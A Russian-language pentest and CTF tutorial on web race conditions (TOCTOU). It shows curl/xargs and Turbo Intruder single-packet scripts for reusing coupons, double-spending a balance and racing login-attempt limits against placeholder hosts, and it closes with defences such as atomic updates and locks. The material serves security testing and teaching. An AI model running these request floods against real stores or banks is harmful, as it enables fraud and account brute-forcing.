**Race condition** (состояние гонки) возникает, когда два запроса обрабатываются одновременно и логика «проверить → изменить» ломается: оба запроса проходят проверку до того, как кто-то из них изменил состояние. На вебе это даёт: использование купона много раз, двойное снятие денег, превышение лимита попыток, обход «одноразовой» проверки, накрутку баланса. Класс — бизнес-логика + concurrency, сканеры его не находят.

## Теория: TOCTOU и окно гонки

Основной паттерн — **TOCTOU** (Time-Of-Check to Time-Of-Use):

```
1. check: баланс >= 100?
2. use:   списать 100
```

Если два запроса выполняют шаг 1 до того, как любой из них выполнит шаг 2, оба «увидят» достаточный баланс и спишут дважды (баланс уйдёт в минус или получите товар за один платёж).

Разновидности:

- **Limit overrun:** лимит «1 купон на пользователя» обходится параллельными запросами.
- **Multiple-use of single-use:** одноразовый токен/промокод применяется многократно.
- **Double-spend:** двойное списание/зачисление.
- **Race в статусах:** заказ переводится в несовместимые статусы.
- **Race с файлами/кэшем:** перезапись между проверкой и использованием.

## Теория: как синхронизировать запросы

Гонку надо **усилить**, отправив запросы максимально одновременно:

1. **Обычный параллелизм** (`xargs -P`, `&`) — грубо, окно широкое, но сервер может обрабатывать последовательно.
2. **Single-packet attack** (HTTP/2) — все запросы отправляются в одном TCP-пакете, устраняя сетевой джиттер → окно гонки минимально и надёжно. Реализовано в Burp (Turbo Intruder, Repeater «Send group in parallel») и в `h2`-скриптах.
3. **Last-byte sync** (HTTP/1.1) — отправить все запросы кроме последнего байта, затем дослать последние байты разом.

## Инструменты: параллельные запросы

Простой параллельный запуск (используйте ТОЛЬКО свой аккаунт/объект):

```bash
seq 20 | xargs -P20 -I{} curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST https://shop.local/redeem -b 'session=me' -d 'code=PROMO123'
```

Если несколько ответов `200` при лимите «1» — гонка.

**Burp Repeater** (2023+): выделите запросы → правый клик → *Send group in parallel (single-packet attack)*.

**Turbo Intruder** — скрипт для точной синхронизации:

```python
# race.py для Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
def handleResponse(req, interesting):
    table.add(req)
```

## Разобранный пример: многократное применение купона

Шаг 1. Находим эндпоинт применения купона:

```bash
curl -s -X POST https://shop.local/cart/coupon -b 'session=me' -d 'code=SAVE10'
# 200 {"discount":10}   (первое применение)
curl -s -X POST https://shop.local/cart/coupon -b 'session=me' -d 'code=SAVE10'
# 400 "already used"    (повторно нельзя)
```

Шаг 2. Отправляем 20 запросов одновременно:

```bash
seq 20 | xargs -P20 -I{} curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST https://shop.local/cart/coupon -b 'session=me' -d 'code=SAVE10'
```

Шаг 3. Проверяем корзину (читаем результат, а не верим коду):

```bash
curl -s https://shop.local/cart -b 'session=me' | jq '.discount, .total'
```

Если скидка применилась несколько раз (или total сильно снизился) — **limit overrun** подтверждён. На CTF это часто «купи флаг бесплатно».

## Разобранный пример: двойное списание с баланса

Шаг 1. У нас баланс 100, перевод стоит 100. Отправляем два перевода по 100 параллельно:

```bash
curl -s -X POST https://bank.local/transfer -b 'session=me' -d 'to=friend&amount=100' &
curl -s -X POST https://bank.local/transfer -b 'session=me' -d 'to=friend&amount=100' &
wait
```

Шаг 2. Проверяем баланс:

```bash
curl -s https://bank.local/balance -b 'session=me' | jq '.balance'
# -100  => оба перевода прошли при балансе 100 => double-spend
```

Для надёжности используйте single-packet attack в Burp: без синхронизации окно может «не поймать» гонку.

## Разобранный пример: обход лимита попыток (rate-limit race)

Если после 5 неверных попыток аккаунт блокируется, но проверка лимита не атомарна, 50 параллельных попыток могут все «пройти» до инкремента счётчика. Это позволяет брутить быстрее лимита. Внимание: не блокируйте чужие аккаунты — тестируйте на своём.

## Частые ошибки

- **Пытаться без синхронизации.** Обычные `&` часто не создают гонку — используйте single-packet attack (Burp) или last-byte sync.
- **Верить коду ответа, а не состоянию.** `200` не значит «применилось»; читайте баланс/корзину/статус.
- **Путать с rate-limit.** Гонка обходит *атомарность* проверки, а не скорость; это разные вещи.
- **Перегружать сервер.** Десятки запросов допустимы, тысячи — DoS. Держите объём низким.
- **Игнорировать HTTP/2.** Многие сервера за HTTP/2 идеально подходят для single-packet гонки.
- **Забывать про статусы.** Гонка может перевести заказ в некорректный статус — это тоже баг.

## Полный разбор: single-packet attack с Turbo Intruder (с выводом)

Single-packet attack (HTTP/2) — самый надёжный способ поймать гонку. Реализуем через Turbo Intruder в Burp.

Шаг 1. Перехватываем запрос применения купона (`POST /cart/coupon`). Отправляем в **Turbo Intruder** (Extensions → Turbo Intruder → Send to Turbo).

Шаг 2. Скрипт с gate (все запросы ждут, затем уходят разом):

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)          # HTTP/2 single-packet
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')                              # последние байты уходят вместе

def handleResponse(req, interesting):
    if 'discount' in req.response:
        table.add(req)
```

Шаг 3. Смотрим таблицу результатов: несколько `200 {"discount":10}` при лимите «1» → гонка поймана. В выводе видно:

```
200  {"discount":10,"total":90}
200  {"discount":10,"total":80}
200  {"discount":10,"total":70}
...
```

Шаг 4. Проверяем итоговое состояние (read-back!), а не код:

```bash
curl -s https://shop.local/cart -b 'session=me' | jq '{discount, total}'
# {"discount": 300, "total": 0}
```

`discount` вырос кратно — limit overrun подтверждён.

Шаг 5. Для HTTP/1.1-цели используйте **last-byte sync**: отправьте все запросы, задержав последний байт, затем досылайте последние байты одновременно.

## Reference-таблица: типы гонок и где искать

| Тип гонки | Где искать | Что даёт |
|-----------|-----------|----------|
| Limit overrun | купоны, промокоды, бонусы | многократное применение |
| Multiple-use of single-use | одноразовые токены, инвайты, ссылки | повторное использование |
| Double-spend | баланс, переводы, списания | двойное списание/зачисление |
| Status race | заказы, тикеты, заявки | несовместимые статусы |
| Race в файлах | загрузка + move, symlink | подмена файла (TOCTOU) |
| Race в кэше | сессии, локи | загрязнение/обход |
| Rate-limit race | лимит попыток логина | быстрее лимита |
| Race при регистрации | username/email unique | дубликаты, takeover |

## HTTP/1.1 last-byte sync и пайплайнинг

При HTTP/1.1 нет единого пакета для мультиплекса, но можно:

- **Last-byte sync:** отправить N запросов, удерживая последний байт каждого; когда сервер их получит, все «дозреют» одновременно. Реализуется сырым сокетом/скриптом.
- **Request pipelining:** отправить несколько запросов подряд в одном соединении — сервер обработает их параллельно, если не сериализует.
- **Проверка:** если обычные `xargs -P` не ловят гонку, а last-byte sync ловит — дело в джиттере.

```python
import socket
# упрощённо: держим последний байт каждого запроса и шлём их вместе
```

## Что делать дальше / решение

1. **Найти конкурентно-чувствительное действие** (купон, баланс, токен, лимит).
2. **Проверить последовательно** — повторный запрос должен отклоняться (иначе это не гонка, а просто баг логики).
3. **Запустить параллельно** (Burp «Send group in parallel» / Turbo Intruder / xargs -P).
4. **Если не ловится** — single-packet attack (h2) или last-byte sync (h1.1).
5. **Подтвердить состоянием** (баланс/корзина/статус), не кодом ответа.
6. **Держать объём низким** (десятки запросов) — не устраивать DoS.
7. **Оформить PoC** с точным числом запросов и итоговым состоянием.

## Как выбирать между методами синхронизации

| Метод | Протокол | Точность | Когда применять |
|-------|----------|----------|-----------------|
| `xargs -P`/`&` | любой | низкая | быстрый чек, широкое окно |
| Burp «Send group in parallel» | h1.1/h2 | высокая | ручная проверка в Repeater |
| Single-packet attack | HTTP/2 | максимальная | узкое окно, продакшн-сервер |
| Last-byte sync | HTTP/1.1 | высокая | когда h2 недоступен |
| Turbo Intruder | оба | максимальная | автоматизация, много запросов |
| Пайплайнинг | h1.1 | средняя | сервер обрабатывает параллельно |

Практический порядок:

1. **Сначала последовательно** — убедиться, что повторный запрос отклоняется (иначе это не гонка).
2. **Затем `xargs -P`** — если ловится, зафиксировать; если нет — усилить синхронизацию.
3. **Single-packet (h2)** — основной инструмент для узких окон.
4. **Last-byte sync (h1.1)** — если сервер только на HTTP/1.1.
5. **Всегда подтверждать состоянием** (баланс, корзина, статус), а не кодом ответа.

Важно: разные действия требуют разного числа запросов. Купон/лимит — 10–30 достаточно; двойное списание — 2–5 (чтобы не увести баланс глубоко в минус и не сломать тестовые данные). Держите объём минимальным и всегда тестируйте на своём аккаунте/объекте.

## Защита: транзакции и атомарность

Гонки лечатся атомарностью на уровне хранилища, а не проверками в коде:

- **Атомарные операции:** `UPDATE balance SET x = x - 100 WHERE id=1 AND x >= 100` — проверка и изменение в одном запросе.
- **Транзакции с блокировками:** `SELECT ... FOR UPDATE` или advisory-lock вокруг критической секции.
- **Уникальные ограничения:** на промокод/пользователя (`UNIQUE(user_id, code)`) — БД отвергнет дубликат.
- **Идемпотентность:** idempotency-key для платёжных операций.
- **Оптимистичные блокировки:** версия/`ETag` в записи.

Если сервер использует read-modify-write без блокировки — гонка возможна. В отчёте укажите конкретный паттерн (TOCTOU) и предложите атомарный вариант.

- **Пентест:** тестирование гонок — часть оценки бизнес-логики и конкурентности.
- **Работа (AppSec/Dev):** транзакции, блокировки и атомарные операции — ключ к защите от гонок.
